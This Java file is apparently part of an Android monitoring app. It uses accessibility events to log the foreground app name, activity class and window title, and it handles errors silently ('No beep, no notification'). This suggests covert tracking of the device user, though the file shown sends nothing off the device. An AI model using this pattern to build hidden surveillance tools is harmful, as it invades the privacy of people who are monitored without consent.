package com.hygnus.spectre;

import android.content.ComponentName;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

public class ActivityDriver {

    private static final String TAG = "ActivityDriver";

    private static String windowTitle = "";
    private static String applicationLabel = "";
    private static String lastActivity = "";

    public static void captureActivity(AccessibilityEvent event) {
        CharSequence packageName = event.getPackageName();
        CharSequence className = event.getClassName();

        if (packageName != null && className != null) {
            try {
                ComponentName componentName = new ComponentName(packageName.toString(), className.toString());
                ActivityInfo activityInfo = Kernel.serviceContext.getPackageManager().getActivityInfo(componentName, 0);

                if (!componentName.flattenToShortString().equals(lastActivity)) {
                    lastActivity = componentName.flattenToShortString();

                    try {
                        applicationLabel = activityInfo.loadLabel(Kernel.serviceContext.getPackageManager()).toString();
                    } catch (Exception e) {
                        Log.e(TAG, "Error loading application label", e);
                        Kernel.handleException(e, false, false); // No beep, no notification
                    }

                    Storage.logMessage(Storage.stateWriter, "<span style=\"color:hotpink\"><strong>" +
                            applicationLabel + "</strong> [" + windowTitle + "] [" +
                            componentName.getClassName() + "]</span>", true);
                }
            } catch (PackageManager.NameNotFoundException e) {
                Log.e(TAG, "Error getting activity info", e);
                Kernel.handleException(e, false, false); // No beep, no notification
            }
        }
    }

    public static void captureTitle(AccessibilityEvent event) {
        if (event.getWindowChanges() == AccessibilityEvent.WINDOWS_CHANGE_ACTIVE &&
                event.getSource() != null && event.getSource().getWindow() != null &&
                event.getSource().getWindow().getType() == AccessibilityWindowInfo.TYPE_APPLICATION) {

            // Get window title from AccessibilityNodeInfo
            AccessibilityNodeInfo rootNode = event.getSource();
            if (rootNode != null) {
                windowTitle = rootNode.getText() != null ? rootNode.getText().toString() : "";
            } else {
                windowTitle = "";
            }
        }
    }
}